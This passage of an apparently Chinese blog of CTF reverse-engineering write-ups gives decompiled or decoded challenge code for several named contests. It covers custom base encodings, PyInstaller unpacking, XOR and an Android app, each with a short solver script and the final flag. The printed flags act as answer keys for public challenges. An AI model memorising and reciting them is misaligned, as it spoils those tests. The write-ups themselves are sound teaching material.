class="line-numbers language-c#" data-language="c#"><code class="language-c#">INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)&#123;  CHAR String[100]; &#x2F;&#x2F; [esp+0h] [ebp-64h] BYREF  if ( a2 !&#x3D; 272 )  &#123;    if ( a2 !&#x3D; 273 )      return 0;    if ( (_WORD)a3 !&#x3D; 1 &amp;&amp; (_WORD)a3 !&#x3D; 2 )    &#123;      sprintf(String, &amp;Format, ++dword_4099F0);      if ( dword_4099F0 &#x3D;&#x3D; 19999 )      &#123;        sprintf(String, &quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;, 19999, 0);&#x2F;&#x2F;格式化输出        SetWindowTextA(hWnd, String);        return 0;      &#125;      SetWindowTextA(hWnd, String);      return 0;    &#125;    EndDialog(hWnd, (unsigned __int16)a3);  &#125;  return 1;&#x2F;&#x2F;可以直接看出flag就是BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛fakebase"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛fakebase"></a> [SWPUCTF 2021 新生赛]fakebase</h2><h3 id="题目描述-13"><a class="markdownIt-Anchor" href="#题目描述-13"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxx'</span>s_box <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjkzxcvb123456#$'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>b1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> b1<span class="token operator">//</span><span class="token number">31</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> s_box<span class="token punctuation">[</span>b1<span class="token operator">%</span><span class="token number">31</span><span class="token punctuation">]</span>    b1 <span class="token operator">=</span> b1<span class="token operator">//</span><span class="token number">31</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># s = u#k4ggia61egegzjuqz12jhfspfkay</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-13"><a class="markdownIt-Anchor" href="#exp-13"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 回到题目本身我们我肯可以得到s的值，其中s的值都是s_box中取的，因此[b1%31]是可以得知的。</span><span class="token comment"># 类似于十进制转二进制的“除二取余法”，但是循环成立条件为b1//31 != 0，所以缺少最后一个数，需要从0-30间进行爆破,进而得到num，转为flag</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>s_box <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjkzxcvb123456#$'</span>s <span class="token operator">=</span> <span class="token string">'u#k4ggia61egegzjuqz12jhfspfkay'</span>tmp<span class="token operator">=</span><span class="token string">''</span>num<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> final <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num<span class="token operator">=</span>final    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        num<span class="token operator">=</span>num<span class="token operator">*</span><span class="token number">31</span><span class="token operator">+</span>s_box<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"CTF"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NSSCTF&#123;WHAt_BASe31&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="nisactf-2022ezpython"><a class="markdownIt-Anchor" href="#nisactf-2022ezpython"></a> [NISACTF 2022]ezpython</h2><h3 id="题目描述-14"><a class="markdownIt-Anchor" href="#题目描述-14"></a> 题目描述</h3><p>pyinstaller是对python打包的第三方库，这个地方是把python程序打包成exe了。。。那我们应该先去拿到原本python源代码。。</p><ul><li>拿到pyc字节码文件</li></ul><pre class="line-numbers language-none"><code class="language-none">python pyinstxtractor.py ez_python.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>拿到源代码<br />这个地方我是直接用uncompyle6就拿到源代码了</li></ul><pre class="line-numbers language-none"><code class="language-none">uncompyle6 src.py &gt; out.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><span class="token comment"># Version : Python 3.4</span><span class="token keyword">import</span> rsa<span class="token keyword">import</span> base64key1 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key2 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    crypto_text <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> crypto_text<span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message_str <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> message_str<span class="token keyword">def</span> <span class="token function">encrypt2</span><span class="token punctuation">(</span>tips<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input key: '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> result <span class="token operator">==</span> key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;0e26d898-b454-43de-9c87-eb3d122186bc&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key is error.'</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">del</span> e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键是要逆向出真的key，然后输入真的key得到flag</p><h3 id="exp-14"><a class="markdownIt-Anchor" href="#exp-14"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#this is true key</span><span class="token comment">#OUTPUT:</span><span class="token comment">#please input key: this is true key</span><span class="token comment">#flag&#123;5236cb7d-f4a7-4080-9bde-8b9e061609ad&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023enbase64"><a class="markdownIt-Anchor" href="#litctf-2023enbase64"></a> [LitCTF 2023]enbase64</h2><h3 id="题目描述-15"><a class="markdownIt-Anchor" href="#题目描述-15"></a> 题目描述</h3><p>换表base64</p><h3 id="exp-15"><a class="markdownIt-Anchor" href="#exp-15"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">"GQTZlSqQXZ/ghxxwhju3hbuZ4wufWjujWrhYe7Rce7ju"</span>code<span class="token operator">=</span><span class="token string">"gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND"</span>coder<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=="</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>enc<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>coder<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">b'LitCTF&#123;B@5E64_l5_tooo0_E3sy!!!!!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛ezpython"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛ezpython"></a> [HUBUCTF 2022 新生赛]ezPython</h2><h3 id="题目描述-16"><a class="markdownIt-Anchor" href="#题目描述-16"></a> 题目描述</h3><p>给了一个pyc文件，直接在线反编译得到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span><span class="token comment"># Version : Python 3.7</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> base58password <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'password.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ans <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base58<span class="token punctuation">.</span>b58encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I've forgot my password,could you please help me find the password?"</span><span class="token punctuation">)</span><span class="token keyword">if</span> ans <span class="token operator">==</span> <span class="token string">'M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw=='</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'You get the password!'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong! try again'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-16"><a class="markdownIt-Anchor" href="#exp-16"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base58<span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlibans<span class="token operator">=</span><span class="token string">'M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw=='</span>password<span class="token operator">=</span>base58<span class="token punctuation">.</span>b58decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'HUBUCTF@1405'</span>flag<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string">b'HUBUCTF@1405'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#fd78ee3399dd6a3c1d0b637fdca0c075</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="swpuctf-2021-新生赛easyapp"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛easyapp"></a> [SWPUCTF 2021 新生赛]easyapp</h2><h3 id="题目描述-17"><a class="markdownIt-Anchor" href="#题目描述-17"></a> 题目描述</h3><p>这个题目是安卓逆向。<br />根本没有做过这种题目，通过观看别人的wp知道了这题是要用到jadx反编译工具。<br />下面附带下载链接：<br /><a href="https://blog.csdn.net/weixin_39142112/article/details/80356244">https://blog.csdn.net/weixin_39142112/article/details/80356244</a><br />把文件丢进jadx里分析<br />我们需要找到这三个关键函数<br />135336<br />135402<br />135468<br />首先查看关键信息，我们在第一个函数中能找到的关键信息就是这一串类似于乱码的字符串<br />135575<br />我们在第二个函数中得到的信息是key的值是123456789然后在下面的for循环中看到了异或加密算法，看到这里我大概就懂了，应该就是把那串字符串去异或这个key。<br />135724<br />我们再来看看最后一个函数干了什么，这个函数好像把key的值修改了，它把123456789改成了987654321.<br />135848</p><h3 id="exp-17"><a class="markdownIt-Anchor" href="#exp-17"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">"棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌"</span>key<span class="token operator">=</span><span class="token number">987654321</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> char <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment">#因为ASCII字符集只有128个字符，所以如果不取模，那么异或运算的结果可能超出ASCII范围，导致无法正确解密。取模128可以保证结果在0到127之间，也就是ASCII字符集的有效范围。</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#NSSCTF&#123;apkYYDS&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gdouctf-2023check_your_luckz3"><a class="markdownIt-Anchor" 